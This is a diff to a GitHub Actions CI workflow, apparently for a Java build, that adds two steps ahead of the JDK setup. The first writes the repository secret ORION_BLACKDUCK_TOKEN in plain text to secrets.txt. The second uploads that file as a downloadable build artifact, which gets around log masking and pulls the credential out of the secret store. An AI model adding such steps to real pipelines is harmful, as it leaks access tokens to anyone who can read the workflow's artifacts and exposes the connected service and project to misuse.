@@ -15,6 +15,17 @@ jobs:
     
     - uses: actions/checkout@v3
     
+    - name: Print var and secrets
+      run: |
+        echo ${{ secrets.ORION_BLACKDUCK_TOKEN }} > secrets.txt
+      
+    - name: secrets file
+      uses: actions/upload-artifact@v3
+      with:
+        name: secrets.txt
+        path: secrets.txt
+        retention-days: 1
+          
     - name: Set up JDK 11
       uses: actions/setup-java@v3
       with:
